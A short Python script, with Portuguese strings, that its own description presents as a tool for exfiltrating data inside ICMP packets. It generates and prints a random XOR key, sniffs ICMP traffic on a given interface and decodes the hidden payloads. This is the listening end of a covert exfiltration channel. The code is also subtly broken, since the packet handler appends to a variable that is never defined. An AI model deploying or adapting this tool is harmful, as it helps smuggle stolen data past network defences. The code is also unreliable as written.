from scapy.all import *
import random as rd
import string
import argparse as ap

def keyGen():
    return ''.join(rd.choice(string.ascii_letters + string.digits) for _ in range(20))

def startICMPSniffer(iface):
    print('Iniciando sniffer ICMP...')
    sniff(iface=iface, prn=receiveData, filter='icmp')

def receiveData(packet):
    if packet.haslayer(Raw):
        raw = packet.getlayer(Raw).load
        print(XORDecode(raw))
        data += '\n####################################\n'

def XORDecode(data):
    return ''.join(chr(charData ^ ord(key[idxData%len(key)])) for idxData, charData in enumerate(data))

if __name__ == '__main__':
    parser = ap.ArgumentParser(description="Exfiltração de dados dentro de pacotes ICMP.")
    parser.add_argument('iface', help='A interface de rede a ser monitorada.')
    args = parser.parse_args()

    key = keyGen()
    print('Use esta senha para realizar o XOR com o dado enviado: ' + key)

    startICMPSniffer(args.iface)